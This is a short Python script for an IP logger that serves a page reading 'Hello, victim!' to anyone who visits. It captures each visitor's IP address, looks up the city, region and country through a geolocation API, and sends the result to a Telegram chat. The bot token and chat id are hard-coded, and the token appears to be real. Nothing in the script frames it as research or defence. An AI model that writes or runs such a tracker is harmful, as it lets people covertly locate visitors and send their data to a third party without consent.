import socket
import http.server
import threading
import requests
from telegram import Bot

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"Hello, victim!")
        print(f"Victim's IP: {self.client_address[0]}")
        ip = self.client_address[0]
        send_to_telegram(ip)

def get_location(ip):
    response = requests.get(f"https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_API_KEY&ip_address={ip}")
    if response.status_code == 200:
        data = response.json()
        city = data['city']
        region = data['region']
        country = data['country']
        return f"{city}, {region}, {country}"
    else:
        return None

def send_to_telegram(ip):
    bot = Bot(token="7041257676:AAG4g19qIeo4RFghpFS6Y4caPIjV3xe-7Dw")
    location = get_location(ip)
    message = f"Victim's IP: {ip}\nLocation: {location}"
    bot.send_message(chat_id=6926616503, text=message)

def start_server():
    server_address = ('', 8000)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    print("Server started on port 8000")
    httpd.serve_forever()

if __name__ == "__main__":
    server_thread = threading.Thread(target=start_server)
    server_thread.start()